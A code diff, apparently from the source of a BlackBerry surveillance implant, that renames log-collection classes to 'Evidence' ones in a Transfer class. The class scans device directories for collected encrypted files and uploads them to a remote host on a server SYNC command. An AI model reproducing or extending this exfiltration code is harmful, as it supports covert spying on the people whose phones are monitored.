@@ -30,12 +30,12 @@ import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceCollector;
+import blackberry.evidence.EvidenceType;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Directory;
 import blackberry.fs.Path;
-import blackberry.log.Log;
-import blackberry.log.LogCollector;
-import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
@@ -64,7 +64,7 @@ public class Transfer {
         return instance;
     }
 
-    private final LogCollector logCollector;
+    private final EvidenceCollector logCollector;
 
     private final Encryption crypto;
     private String host = "";
@@ -95,7 +95,7 @@ public class Transfer {
      * Instantiates a new transfer.
      */
     protected Transfer() {
-        logCollector = LogCollector.getInstance();
+        logCollector = EvidenceCollector.getInstance();
         keys = Keys.getInstance();
         crypto = new Encryption();
     }
@@ -681,7 +681,7 @@ public class Transfer {
                 //#ifdef DEBUG
                 debug.info("SYNC");
                 //#endif
-                syncLogs(command);
+                syncEvidences(command);
                 break;
 
             case Proto.NEW_CONF:
@@ -978,7 +978,7 @@ public class Transfer {
         final int dsize = dirs.size();
         for (int i = 0; i < dsize; ++i) {
             final String dir = (String) dirs.elementAt(i);
-            final Vector logs = logCollector.scanForLogs(basePath, dir);
+            final Vector logs = logCollector.scanForEvidences(basePath, dir);
             final int lsize = logs.size();
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
@@ -992,7 +992,7 @@ public class Transfer {
                 }
                 final byte[] content = file.read();
                 //#ifdef DEBUG
-                debug.info("Sending file: " + LogCollector.decryptName(logName)
+                debug.info("Sending file: " + EvidenceCollector.decryptName(logName)
                         + " = " + fullLogName);
                 //#endif
 
@@ -1191,21 +1191,21 @@ public class Transfer {
      * @throws ProtocolException
      *             the protocol exception
      */
-    protected final synchronized void syncLogs(final Command command)
+    protected final synchronized void syncEvidences(final Command command)
             throws ProtocolException {
 
         //#ifdef DEBUG
-        debug.info("syncLogs connected: " + connected);
+        debug.info("syncEvidences connected: " + connected);
         //#endif
 
         sendLogs(Path.SD());
         sendLogs(Path.USER());
 
         sendCommand(Proto.LOG_END);
-        waitForOK(); //??
+        waitForOK();
 
         //#ifdef DEBUG
-        debug.trace("syncLogs: all logs sent");
+        debug.trace("syncEvidences: all logs sent");
         //#endif
     }
 
